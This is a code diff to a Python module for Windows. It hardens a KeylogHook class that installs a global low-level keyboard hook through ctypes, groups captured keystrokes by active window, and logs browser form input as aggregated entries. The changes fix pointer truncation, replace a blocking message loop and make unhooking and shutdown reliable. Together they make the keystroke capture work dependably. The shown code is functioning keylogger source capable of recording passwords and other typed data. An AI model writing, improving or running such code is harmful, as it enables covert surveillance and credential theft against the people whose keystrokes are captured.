@@ -19,7 +19,9 @@
 #     images, and only when the target app itself uses that SDK.
 # ============================================================================
 
+import atexit
 import ctypes
+import ctypes.wintypes
 import datetime
 import json
 import os
@@ -30,8 +32,40 @@ import time
 user32 = ctypes.windll.user32
 kernel32 = ctypes.windll.kernel32
 
+# --- Win32 API prototypes -------------------------------------------------
+# ctypes defaults an undeclared restype to a 32-bit int.  A low-level keyboard
+# hook handle (HHOOK) and a module handle (HMODULE) are pointers, so on 64-bit
+# Windows their upper 32 bits were silently truncated.  Passing the mangled
+# HHOOK to UnhookWindowsHookEx() corrupted the stack and produced the access
+# violation seen at shutdown.  Declaring the prototypes fixes that.
+user32.SetWindowsHookExW.restype = ctypes.c_void_p
+user32.SetWindowsHookExW.argtypes = [
+    ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint]
+user32.UnhookWindowsHookEx.restype = ctypes.c_bool
+user32.UnhookWindowsHookEx.argtypes = [ctypes.c_void_p]
+user32.CallNextHookEx.restype = ctypes.c_void_p
+user32.CallNextHookEx.argtypes = [
+    ctypes.c_void_p, ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p]
+user32.PostThreadMessageW.restype = ctypes.c_bool
+user32.PostThreadMessageW.argtypes = [
+    ctypes.c_uint, ctypes.c_uint, ctypes.c_void_p, ctypes.c_void_p]
+user32.PeekMessageW.restype = ctypes.c_bool
+user32.PeekMessageW.argtypes = [
+    ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint, ctypes.c_uint,
+    ctypes.c_uint]
+user32.TranslateMessage.restype = ctypes.c_bool
+user32.TranslateMessage.argtypes = [ctypes.c_void_p]
+user32.DispatchMessageW.restype = ctypes.c_void_p
+user32.DispatchMessageW.argtypes = [ctypes.c_void_p]
+kernel32.GetCurrentThreadId.restype = ctypes.c_uint
+kernel32.GetCurrentThreadId.argtypes = []
+kernel32.GetModuleHandleW.restype = ctypes.c_void_p
+kernel32.GetModuleHandleW.argtypes = [ctypes.c_void_p]
+
 _EV_KEYDOWN = 0x0100
 _WH_KEYBOARD_LL = 13
+_WM_QUIT = 0x0012
+_PM_REMOVE = 0x0001
 
 WINDOW_STYLES = {
     112: "CONSOLE", 101: "EDIT", 201: "BROWSER", 0x800000: "TOPLEVEL",
@@ -254,6 +288,7 @@ class KeylogHook(_Base):
         self.suspend = suspend
         self._hook = None
         self._proc = None
+        self._hook_tid = 0
         self._buf = []
         # Per-window buffering: keystrokes are grouped by the active window
         # so browser form input is logged as ONE aggregated form-aware entry
@@ -269,25 +304,47 @@ class KeylogHook(_Base):
         t = threading.Thread(target=self._run, name="keyhook", daemon=True)
         t.start()
         self._threads.append(t)
-        while self._hook is None:
+        # Guarantee the hook is released even if the process exits without an
+        # explicit stop().  atexit runs on the main thread, so stop() posts
+        # WM_QUIT to the hook thread's queue to break its pump first.
+        atexit.register(self.stop)
+        deadline = time.time() + 2.0
+        while ((self._hook is None) and t.is_alive()
+               and time.time() < deadline):
             time.sleep(0.02)
         return self
 
     def _run(self):
+        # Remember the owning thread id so stop() can post WM_QUIT to the
+        # right message queue, and so the hook is released on the same thread
+        # that installed it (Windows requires unhooking on the owning thread).
+        self._hook_tid = kernel32.GetCurrentThreadId()
         self._proc = _KeylogProc(self._callback)
         self._hook = user32.SetWindowsHookExW(
             _WH_KEYBOARD_LL, self._proc, kernel32.GetModuleHandleW(None), 0)
         msg = ctypes.wintypes.MSG() if hasattr(ctypes, "wintypes") else None
-        while not self._stop.is_set():
-            try:
+        try:
+            # Non-blocking pump: PeekMessageW returns immediately, so the loop
+            # re-checks self._stop instead of parking forever inside the old
+            # blocking GetMessageW() (which ignored stop() until teardown).
+            while not self._stop.is_set():
                 if msg is not None:
-                    user32.GetMessageW(ctypes.byref(msg), 0, 0, 0)
-                else:
-                    time.sleep(0.05)
-            except Exception:
-                break
-        if self._hook:
-            user32.UnhookWindowsHookEx(self._hook)
+                    if user32.PeekMessageW(ctypes.byref(msg), None, 0, 0,
+                                           _PM_REMOVE):
+                        if msg.message == _WM_QUIT:
+                            break
+                        user32.TranslateMessage(ctypes.byref(msg))
+                        user32.DispatchMessageW(ctypes.byref(msg))
+                        continue
+                time.sleep(0.02)
+        finally:
+            # Unhook on the owning thread; tolerate a missing/gone handle.
+            hook, self._hook = self._hook, None
+            if hook:
+                try:
+                    user32.UnhookWindowsHookEx(hook)
+                except Exception:
+                    pass
 
     def _callback(self, nCode, wParam, lParam):
         if nCode >= 0 and wParam == _EV_KEYDOWN and not self._stop.is_set():
@@ -382,13 +439,26 @@ class KeylogHook(_Base):
 
     def stop(self):
         self.flush_all()
+        if self._stop.is_set():
+            return
         self._stop.set()
-        if self._hook:
+        tid = self._hook_tid
+        if tid:
             try:
-                user32.PostThreadMessageW(
-                    threading.get_ident() if False else 0, 0x0012, 0, 0)
+                # Wake the pump so the hook thread exits its loop and unhooks
+                # on its own thread.  Posting to a dead tid fails harmlessly.
+                user32.PostThreadMessageW(tid, _WM_QUIT, 0, 0)
             except Exception:
                 pass
+        # Join only when called from another thread (a thread cannot join
+        # itself); this makes shutdown deterministic instead of racing the
+        # interpreter teardown.
+        if tid and kernel32.GetCurrentThreadId() != tid:
+            for t in list(self._threads):
+                try:
+                    t.join(timeout=2.0)
+                except Exception:
+                    pass
 
 
 # --------------------------------------------------------------------------
